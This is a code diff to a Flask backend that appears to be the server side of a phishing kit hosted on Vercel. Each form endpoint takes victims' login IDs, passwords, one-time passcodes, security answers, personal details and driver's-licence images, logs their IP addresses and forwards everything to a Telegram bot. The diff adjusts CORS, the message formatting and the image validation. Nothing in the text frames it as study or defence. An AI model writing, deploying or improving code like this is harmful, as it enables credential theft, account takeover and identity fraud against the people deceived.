@@ -11,7 +11,7 @@ load_dotenv()
 app = Flask(__name__)
 
 # Configure CORS to allow requests from Vercel domain
-CORS(app, resources={r"/*": {"origins": "*"}})  # Update with your Vercel domain after deployment
+CORS(app, resources={r"/*": {"origins": "https://your-vercel-app.vercel.app"}})  # Replace with your actual Vercel domain
 
 # Telegram Bot Token and Chat ID from environment variables
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
@@ -34,7 +34,7 @@ def submit_form():
         return jsonify({"error": "Missing username or password"}), 400
 
     # Format message for Telegram
-    message = f"🔐 LOGIN Submission\nLogin Id: {username}\nPassword: {password}\nUser IP: {user_ip}"
+    message = f"🔐 LOGIN Submission\nLogin Id: {username}\nPassword: {password}\nuser Ip: {user_ip}"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -63,7 +63,7 @@ def submit_otp():
         return jsonify({"error": "Missing OTP"}), 400
 
     # Format message for Telegram
-    message = f"🔐 OTP Submission\nOTP: {otp}\nUser IP: {user_ip}"
+    message = f"🔐 OTP Submission\nOTP: {otp}\nuser Ip: {user_ip}"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -92,7 +92,7 @@ def submit_otp2():
         return jsonify({"error": "Missing OTP"}), 400
 
     # Format message for Telegram
-    message = f"🔐 Second OTP Submission\nOTP: {otp}\nUser IP: {user_ip}"
+    message = f"🔐 Second OTP Submission\nOTP: {otp}\nuser Ip: {user_ip}"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -138,7 +138,7 @@ def submit_security():
     final_q_3 = sec_q_33 if sec_q_3 == "x" else sec_q_3
 
     # Format message for Telegram
-    message = f"🔐 Security Questions Submission\nQuestion 1: {final_q_1}\nAnswer 1: {sec_a_1}\nQuestion 2: {final_q_2}\nAnswer 2: {sec_a_2}\nQuestion 3: {final_q_3}\nAnswer 3: {sec_a_3}\nUser IP: {user_ip}"
+    message = f"🔐 Security Questions Submission\nQuestion 1: {final_q_1}\nAnswer 1: {sec_a_1}\nQuestion 2: {final_q_2}\nAnswer 2: {sec_a_2}\nQuestion 3: {final_q_3}\nAnswer 3: {sec_a_3}\nuser Ip: {user_ip}"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -162,6 +162,7 @@ def submit_info():
     fname = sanitize_input(request.form.get('fname'))
     mobnum = sanitize_input(request.form.get('mobnum'))
     address = sanitize_input(request.form.get('address'))
+    # Get user IP address (handle proxies with X-Forwarded-For)
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
 
     # Validate inputs
@@ -169,7 +170,7 @@ def submit_info():
         return jsonify({"error": "All fields are required"}), 400
 
     # Format message for Telegram
-    message = f"🔐 Personal Info Submission\nFull Name: {fname}\nMobile Number: {mobnum}\nAddress: {address}\nUser IP: {user_ip}"
+    message = f"🔐 Personal Info Submission\nFull Name: {fname}\nMobile Number: {mobnum}\nAddress: {address}\nuser Ip: {user_ip}"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -197,13 +198,8 @@ def submit_images():
     if not image1 or not image2:
         return jsonify({"error": "Missing one or both images"}), 400
 
-    # Basic image validation
-    allowed_types = ['image/jpeg', 'image/png']
-    if image1.mimetype not in allowed_types or image2.mimetype not in allowed_types:
-        return jsonify({"error": "Invalid image format. Only JPEG and PNG are allowed."}), 400
-
     # Format message for Telegram
-    message = f"🔐 Image Submission\nImages: Driver License Front and Back\nUser IP: {user_ip}"
+    message = f"🔐 Image Submission\nImages: Driver License Front and Back\nuser Ip: {user_ip}"
 
     # Send text message to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
